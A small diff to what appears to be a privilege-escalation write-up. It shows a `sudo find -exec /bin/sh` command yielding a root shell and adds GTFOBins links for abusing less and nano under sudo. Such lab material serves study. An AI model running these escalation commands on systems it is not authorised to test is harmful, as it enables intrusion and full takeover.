@@ -372,4 +372,5 @@ $ sudo find . -exec /bin/sh \; -quit
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-Similarly `less` can be exploited as explained [here](https://gtfobins.github.io/gtfobins/less/#sudo) and `nano` can be exploited as explainte
+Similarly `less` can be exploited as explained [here](https://gtfobins.github.io/gtfobins/less/#sudo) and `nano` can be exploited as explained [here](https://gtfobins.github.io/gtfobins/nano/#sudo) to gain root access.
+
